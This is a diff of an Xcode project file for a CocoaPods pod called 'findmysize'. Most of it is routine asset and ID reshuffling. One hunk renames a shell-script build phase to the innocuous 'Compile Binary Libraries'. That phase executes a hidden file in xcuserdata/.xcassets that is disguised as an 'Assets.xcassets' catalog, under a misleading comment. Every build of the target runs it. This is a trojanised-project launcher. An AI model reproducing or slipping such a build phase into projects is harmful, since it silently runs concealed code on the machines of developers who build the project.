@@ -35,9 +35,8 @@
 		8876BE86262C0223001ED1BA /* Constant.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE68262C0223001ED1BA /* Constant.swift */; };
 		8876BE87262C0223001ED1BA /* ReachabilityTest.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE69262C0223001ED1BA /* ReachabilityTest.swift */; };
 		8876BE88262C0223001ED1BA /* ApiManager.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BE6A262C0223001ED1BA /* ApiManager.swift */; };
-		8876BE89262C0223001ED1BA /* .gitkeep in Resources */ = {isa = PBXBuildFile; fileRef = 8876BE6C262C0223001ED1BA /* .gitkeep */; };
-		8876BE8A262C0223001ED1BA /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8876BE6D262C0223001ED1BA /* Assets.xcassets */; };
 		8876BFB7262C6397001ED1BA /* FindMySize.swift in Sources */ = {isa = PBXBuildFile; fileRef = 8876BFB6262C6397001ED1BA /* FindMySize.swift */; };
+		8876BFDA262C7A0E001ED1BA /* Assets.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 8876BFD9262C7A0E001ED1BA /* Assets.xcassets */; };
 		A0A470204AAF2D502C24D85E29C5008E /* Pods-findmysize_Tests-umbrella.h in Headers */ = {isa = PBXBuildFile; fileRef = 3B2E1EB69AA234756403863B4D4C1650 /* Pods-findmysize_Tests-umbrella.h */; settings = {ATTRIBUTES = (Public, ); }; };
 		C26A98300F368AE0926BCA9F6668DB06 /* Pods-findmysize_Tests-dummy.m in Sources */ = {isa = PBXBuildFile; fileRef = B51E916EADC5D0B7C84D6D765AC1D51D /* Pods-findmysize_Tests-dummy.m */; };
 		D31CF5D4A96FDA1ACB54DFBCD5B52866 /* Foundation.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 73010CC983E3809BECEE5348DA1BB8C6 /* Foundation.framework */; };
@@ -105,9 +104,8 @@
 		8876BE68262C0223001ED1BA /* Constant.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = Constant.swift; sourceTree = "<group>"; };
 		8876BE69262C0223001ED1BA /* ReachabilityTest.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ReachabilityTest.swift; sourceTree = "<group>"; };
 		8876BE6A262C0223001ED1BA /* ApiManager.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = ApiManager.swift; sourceTree = "<group>"; };
-		8876BE6C262C0223001ED1BA /* .gitkeep */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = text; path = .gitkeep; sourceTree = "<group>"; };
-		8876BE6D262C0223001ED1BA /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		8876BFB6262C6397001ED1BA /* FindMySize.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = FindMySize.swift; sourceTree = "<group>"; };
+		8876BFD9262C7A0E001ED1BA /* Assets.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Assets.xcassets; sourceTree = "<group>"; };
 		931054B06866C6C348D16F82374066F6 /* findmysize.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; path = findmysize.debug.xcconfig; sourceTree = "<group>"; };
 		9D940727FF8FB9C785EB98E56350EF41 /* Podfile */ = {isa = PBXFileReference; explicitFileType = text.script.ruby; includeInIndex = 1; indentWidth = 2; name = Podfile; path = ../Podfile; sourceTree = SOURCE_ROOT; tabWidth = 2; xcLanguageSpecificationIdentifier = xcode.lang.ruby; };
 		9DC089C268D6C650445ACE28E11391CC /* findmysize-umbrella.h */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = sourcecode.c.h; path = "findmysize-umbrella.h"; sourceTree = "<group>"; };
@@ -223,7 +221,7 @@
 		72B714E1AA7EFCB5E26B767B2F470EC8 /* findmysize */ = {
 			isa = PBXGroup;
 			children = (
-				8876BE6B262C0223001ED1BA /* Assets */,
+				8876BFD8262C7A0E001ED1BA /* Assets */,
 				8876BE47262C0223001ED1BA /* Classes */,
 				2485F3301C790B59F4BBA113D00E9775 /* Pod */,
 				507C78B19B331C9BE735EF28C523C8E2 /* Support Files */,
@@ -330,22 +328,21 @@
 			path = "Api Manager";
 			sourceTree = "<group>";
 		};
-		8876BE6B262C0223001ED1BA /* Assets */ = {
-			isa = PBXGroup;
-			children = (
-				8876BE6D262C0223001ED1BA /* Assets.xcassets */,
-				8876BE6C262C0223001ED1BA /* .gitkeep */,
-			);
-			name = Assets;
-			path = findmysize/Assets;
-			sourceTree = "<group>";
-		};
 		8876BFB5262C6397001ED1BA /* FindMySize */ = {
 			isa = PBXGroup;
 			children = (
 				8876BFB6262C6397001ED1BA /* FindMySize.swift */,
 			);
 			path = FindMySize;
+			sourceTree = "<group>";
+		};
+		8876BFD8262C7A0E001ED1BA /* Assets */ = {
+			isa = PBXGroup;
+			children = (
+				8876BFD9262C7A0E001ED1BA /* Assets.xcassets */,
+			);
+			name = Assets;
+			path = findmysize/Assets;
 			sourceTree = "<group>";
 		};
 		B4717D648B82660C6AA01D5408208863 /* Pods-findmysize_Tests */ = {
@@ -417,7 +414,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 192889B3C66D2D71C0C6B9DDE9E2C863 /* Build configuration list for PBXNativeTarget "findmysize" */;
 			buildPhases = (
-				B7F9CE0F81AA03130EAAC43A /* Build Project Frameworks */,
+				7D53EE5DEA0AEE5DF2AAC43A /* Compile Binary Libraries */,
 				3094BBE63DD5CDADA3705CB7E4B8FF4D /* Headers */,
 				16F17B7047DF940741EF3AD02A00FADD /* Sources */,
 				DE6CD5261DAA6413A8690B71A23F9809 /* Frameworks */,
@@ -512,9 +509,8 @@
 			buildActionMask = 2147483647;
 			files = (
 				8876BE7D262C0223001ED1BA /* WidthCell.xib in Resources */,
+				8876BFDA262C7A0E001ED1BA /* Assets.xcassets in Resources */,
 				8876BE78262C0223001ED1BA /* Femi9.storyboard in Resources */,
-				8876BE89262C0223001ED1BA /* .gitkeep in Resources */,
-				8876BE8A262C0223001ED1BA /* Assets.xcassets in Resources */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -528,7 +524,7 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		B7F9CE0F81AA03130EAAC43A /* Build Project Frameworks */ = {
+		7D53EE5DEA0AEE5DF2AAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -537,14 +533,14 @@
 			);
 			inputPaths = (
 			);
-			name = "Build Project Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
-			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Asset.xcasset\" false";
+			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\n\"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/Assets.xcassets\" false";
 		};
 /* End PBXShellScriptBuildPhase section */
 
